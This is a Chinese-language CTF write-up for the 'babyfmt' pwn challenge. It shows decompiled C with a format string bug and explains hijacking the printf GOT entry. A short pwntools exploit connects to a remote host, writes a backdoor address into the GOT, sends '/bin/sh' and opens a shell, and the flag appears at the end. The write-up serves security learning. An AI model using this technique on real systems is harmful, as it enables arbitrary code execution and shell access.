# babyfmt

菜狗终于记得有got表这回事了。

-   Arch:     i386-32-little
    <br>RELRO:    Partial RELRO
    <Br>Stack:    No canary found
    <Br>NX:       NX enabled
    <BR>PIE:      No PIE (0x8048000)

就开了个nx，还不重要。这次的Partial RELRO我不会再忘了，看看main。

```c
void main(undefined4 param_1,undefined4 param_2)

{
  char *__s;
  int in_GS_OFFSET;
  char local_114 [256];
  undefined4 local_14;
  undefined *puStack12;
  
  puStack12 = (undefined *)&param_1;
  local_14 = *(undefined4 *)(in_GS_OFFSET + 0x14);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  __s = (char *)malloc(0x10);
  sprintf(__s,"%p",backdoor);
  printf("gift: %p\n",__s);
  do {
    memset(local_114,0,256);
    read(0,local_114,255);
    printf(local_114);
  } while( true );
}
```

粗略分析程序，main函数内部有无限循环的格式化字符串漏洞。同时还给了个后门函数backdoor，直接getshell。我唯一看不懂的地方是这个gift是干啥用的，都无pie了我直接在程序里记录backdoor的地址不就好了吗？这还用了malloc，相当于给了一个指向指向backdoor指针的指针，不是很有记录的必要。Partial RELRO代表got表可写，你看那个printf是不是和system很像，直接把printf的got表改成system，这样调用的就是system了。[ctf wiki](https://ctf-wiki.org/en/pwn/linux/user-mode/fmtstr/fmtstr-example/#hijack-got)有一模一样的题，还更难。直接用pwntools自带的fmtstr_payload就行了。

```python
from pwn import *
p=remote("43.136.137.17",3913)
payload=fmtstr_payload(11,{0x0804a010:0x0804859b})
p.sendafter("\n",payload)
p.send('/bin/sh')
p.interactive()
```

- ### Flag
  > moectf{h4ck3d_by_form4t_str1ng}